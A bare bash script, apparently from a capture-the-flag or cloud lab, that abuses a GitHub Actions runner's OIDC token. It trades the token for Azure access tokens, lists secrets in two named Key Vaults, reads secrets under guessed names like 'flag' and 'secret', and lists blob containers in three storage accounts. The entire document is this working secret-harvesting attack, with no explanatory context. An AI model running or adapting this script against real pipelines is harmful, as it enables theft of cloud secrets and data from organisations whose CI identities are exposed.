#!/usr/bin/env bash
set -uo pipefail
TENANT="${AZURE_TENANT_ID}"; CLIENT="${AZURE_CLIENT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
tok() { curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=${CLIENT}" --data-urlencode "scope=$1" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
KV=$(tok https://vault.azure.net/.default)
for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  echo "== VAULT $V list =="
  curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets?api-version=7.4&maxresults=25"; echo
done
for s in flag FLAG flag-tbl kv-flag secret; do
  echo "== kv-tbl-sec-x3euoz/$s =="
  curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$s?api-version=7.4"; echo
done
ST=$(tok https://storage.azure.com/.default)
for A in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz; do
  echo "== $A containers =="
  curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/?comp=list"; echo
done
